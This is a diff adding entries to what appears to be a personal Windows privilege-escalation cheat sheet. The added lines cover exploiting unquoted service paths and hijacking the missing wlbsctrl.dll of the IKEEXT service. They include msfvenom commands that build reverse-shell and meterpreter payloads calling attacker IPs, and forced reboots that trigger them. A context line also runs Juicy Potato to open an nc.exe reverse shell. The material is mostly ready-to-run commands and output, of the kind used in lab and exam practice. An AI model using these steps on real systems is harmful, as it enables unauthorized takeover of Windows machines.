@@ -747,6 +747,53 @@ dir C:\Windows\System32\config\RegBack\SYSTEM
 wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
 reg query HKLM /f pass /t REG_SZ /s
 
+Find unquoted paths
+Then look up the service, see if there is an exploit 
+The Path my also be writtable by the user.
+Copy a reverse.exe into the writtable path.
+
+wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
+wmic service get name, displayname, pathname, startmode |findstr /i "auto"| findstr /i /v "c:\windows\\" | findstr /i /v """
+icacls "C:\THE_VULN_PATH\THE_WRITABLE_SUBFOLDER"
+
+msfvenom -p windows/shell_reverse_tcp -f exe --platform windows -a x86 -e generic/none LHOST=192.168.49.130 LPORT=444 > pwn.exe
+
+If you dont have permisions to start/stop but it starts auto, just reboot
+shutdown -r -t 10 && exit
+
+
+IKE and AuthIP IPsec Keyring Modules Service (IKEEXT) - Missing DLL. First we will check if the IKEEXT service exists, is enabled, and running.
+sc query IKEEXT
+sc query IKEEXT
+
+SERVICE_NAME: IKEEXT
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+Next, we need to check if the wlbsctrl.dll file exists on the system.
+C:\System>dir wlbsctrl.dll /s
+dir wlbsctrl.dll /s
+ Volume in drive C is HDD
+ Volume Serial Number is DC74-4FCB
+File Not Found
+
+Next, we’ll check the PATH variable.
+C:\UnrealTournament\System>PATH
+PATH
+PATH=C:\Python\Scripts\;C:\Python\;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
+he *C:\Python\Scripts* and *C:\Python* directories are interesting, so let’s check their permissions.
+icacls C:\Python\Scripts\
+Both folders have the Modify permission granted for NT AUTHORITY\Authenticated Users so we can use either of them to write our custom wlbsctrl.dll file.
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.118.3 LPORT=4445 -f dll > wlbsctrl.dll
+
+Place it where the python scripts are and then reboot
+shutdown -r -t 10 && exit
 
 windows 7
 . .\Juicy.Potato.x86.exe -l 7777 -p c:\windows\system32\cmd.exe -a "/c C:\Users\jill\desktop\nc.exe -e cmd.exe 192.168.119.136 5555" -t * -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}"
